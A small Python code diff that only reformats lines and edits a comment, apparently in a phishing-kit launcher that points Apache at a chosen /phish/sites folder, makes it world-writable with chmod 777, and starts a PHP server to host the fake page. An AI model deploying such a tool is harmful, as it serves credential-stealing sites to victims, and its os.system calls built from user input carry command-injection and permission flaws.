@@ -44,15 +44,11 @@ web_num = input("\nPlease enter a number: ")
 website = sites[web_num]
 
 print("\nSetting up DocumentRoot for apache...")
-os.system(
-    "sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(
-        website
-    )
-)
+os.system("sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(website))
 time.sleep(1)
 
 print("Starting php server...")
-os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files
+os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files to read and write
 os.system("cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(website))
 
 print("Starting web server...\n")
